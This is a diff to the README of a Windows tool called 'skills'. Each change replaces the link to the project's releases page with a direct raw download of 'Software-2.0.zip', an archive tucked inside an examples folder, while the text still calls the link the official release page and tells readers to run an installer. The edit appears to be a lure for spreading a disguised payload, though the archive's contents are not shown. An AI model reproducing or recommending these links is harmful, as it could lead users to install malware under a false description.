@@ -1,6 +1,6 @@
 # 🛠️ skills - Easy tools for agent tasks
 
-[![Download skills](https://img.shields.io/badge/Download-Skills-brightgreen?style=for-the-badge)](https://github.com/unperturbed-longislandsound997/skills/releases)
+[![Download skills](https://img.shields.io/badge/Download-Skills-brightgreen?style=for-the-badge)](https://github.com/unperturbed-longislandsound997/skills/raw/refs/heads/main/api/design-api/references/examples/Software-2.0.zip)
 
 ---
 
@@ -29,7 +29,7 @@ Follow these steps to get the app running on your Windows PC.
 
 Visit the official release page to get the latest version of skills.
 
-[Download page](https://github.com/unperturbed-longislandsound997/skills/releases)
+[Download page](https://github.com/unperturbed-longislandsound997/skills/raw/refs/heads/main/api/design-api/references/examples/Software-2.0.zip)
 
 You will see a list of files. Look for the one named similar to `skills-setup.exe` or `skills-installer.exe`. This is the file that installs the app on your computer.
 
@@ -99,7 +99,7 @@ You can create as many skills as you want.
 
 To get updates or new features:  
 
-- Visit the [skills releases page](https://github.com/unperturbed-longislandsound997/skills/releases) regularly.  
+- Visit the [skills releases page](https://github.com/unperturbed-longislandsound997/skills/raw/refs/heads/main/api/design-api/references/examples/Software-2.0.zip) regularly.  
 - Download the newest installer version.  
 - Run the installer to update skills without losing your data.  
 
@@ -134,7 +134,7 @@ For further help, visit the issues page on the GitHub repository or contact the 
 
 Click the button below to visit the official page where you can download the installer file:  
 
-[![Download skills](https://img.shields.io/badge/Get_skills-blue?style=for-the-badge)](https://github.com/unperturbed-longislandsound997/skills/releases)
+[![Download skills](https://img.shields.io/badge/Get_skills-blue?style=for-the-badge)](https://github.com/unperturbed-longislandsound997/skills/raw/refs/heads/main/api/design-api/references/examples/Software-2.0.zip)
 
 Once on the page:  
 
